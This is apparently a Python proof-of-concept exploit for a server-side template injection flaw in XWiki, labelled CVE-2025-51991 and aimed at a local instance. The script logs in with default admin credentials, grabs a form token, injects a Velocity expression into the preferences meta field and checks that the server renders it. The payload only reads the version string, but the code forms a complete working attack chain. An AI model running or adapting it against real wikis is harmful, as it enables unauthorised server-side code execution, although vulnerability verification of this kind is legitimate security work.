#!/usr/bin/env python3
import requests
import sys
import re
import time
import random
import string

TARGET_URL = "http://localhost:8081"

def get_session_and_token(session):
    resp = session.get(f"{TARGET_URL}/bin/view/Main/")
    return resp

def login(session, username="admin", password="admin"):
    login_url = f"{TARGET_URL}/bin/loginsubmit/XWiki/XWikiLogin"
    data = {
        "j_username": username,
        "j_password": password,
        "form_token": "",
    }
    resp = session.post(login_url, data=data, allow_redirects=True)
    return "Log-in" not in resp.text

def get_form_token(session):
    resp = session.get(f"{TARGET_URL}/bin/edit/XWiki/XWikiPreferences?editor=object")
    match = re.search(r'data-xwiki-form-token="([^"]+)"', resp.text)
    if match:
        return match.group(1)
    return None

def inject_ssti(session, form_token, payload):
    save_url = f"{TARGET_URL}/bin/save/XWiki/XWikiPreferences"
    data = {
        "form_token": form_token,
        "XWiki.XWikiPreferences_0_meta": payload,
        "minorEdit": "1"
    }
    resp = session.post(save_url, data=data, allow_redirects=True)
    return resp

def verify_ssti(session, marker):
    resp = session.get(f"{TARGET_URL}/bin/view/Main/")
    return resp.text, marker in resp.text

def main():
    print("[*] CVE-2025-51991 XWiki SSTI PoC")
    print(f"[*] Target: {TARGET_URL}")
    print("[*] Vulnerability: Server-Side Template Injection in HTTP Meta Info field")
    print()
    
    session = requests.Session()
    
    print("[*] Initializing session...")
    get_session_and_token(session)
    
    print("[*] Logging in as admin...")
    if not login(session):
        print("[-] Login failed")
        sys.exit(1)
    print("[+] Login successful")
    
    print("[*] Getting form token...")
    form_token = get_form_token(session)
    if not form_token:
        print("[-] Failed to get form token")
        sys.exit(1)
    print(f"[+] Form token: {form_token}")
    
    rand_marker = ''.join(random.choices(string.ascii_lowercase, k=8))
    ssti_payload = f'<meta name="ssti-poc-{rand_marker}" content="$xwiki.getVersion()" />'
    
    print(f"[*] Injecting SSTI payload: $xwiki.getVersion()")
    print(f"[*] Payload: {ssti_payload}")
    inject_ssti(session, form_token, ssti_payload)
    
    print("[*] Verifying SSTI execution...")
    time.sleep(1)
    result_html, _ = verify_ssti(session, "")
    
    pattern = f'<meta name="ssti-poc-{rand_marker}" content="([^"]*)"'
    match = re.search(pattern, result_html)
    
    if match:
        rendered_value = match.group(1)
        print(f"[+] Rendered value: {rendered_value}")
        
        if rendered_value and rendered_value != "$xwiki.getVersion()":
            print()
            print("[+] ========================================")
            print("[+] SSTI VULNERABILITY CONFIRMED!")
            print("[+] ========================================")
            print(f"[+] XWiki version detected: {rendered_value}")
            print("[+] Velocity template code was executed on the server")
            print("[+] Affected: XWiki <= 17.3.0")
            return True
        else:
            print("[-] Template was not executed")
            return False
    else:
        print("[-] Could not find injected meta tag")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
